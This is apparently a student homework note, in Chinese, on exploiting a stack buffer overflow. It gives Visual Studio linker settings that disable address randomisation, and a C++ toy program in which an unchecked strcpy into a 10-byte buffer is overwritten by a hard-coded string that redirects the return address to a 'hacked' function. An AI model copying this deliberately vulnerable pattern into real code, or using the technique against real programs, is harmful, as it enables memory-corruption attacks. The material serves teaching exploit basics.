# 二进制缓冲区溢出漏洞的利用

## 配置

预配置：按照homework_3进行配置

让程序地址固定：

右键属性->链接器->高级->设置：

1. 基址：0x00400000 (8位$2^8$即32位机)
2. 随机基址：否
3. 固定基址：是FIXED

~~~c++
#define _CRT_SECURE_NO_WARNINGS

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int hacked()
{
	printf("hacked!!");
}

int sub(char* x)
{
	char y[10];
	strcpy(y, x);
	return 0;
}

// 213115C9
char *ov = "1234123512361237\xc9\x15\x31\x21";
int main(int argc, char** argv)
{
	if (argc > 1)
		sub(ov);
	printf("exit");
}
~~~

hacked地址213115C9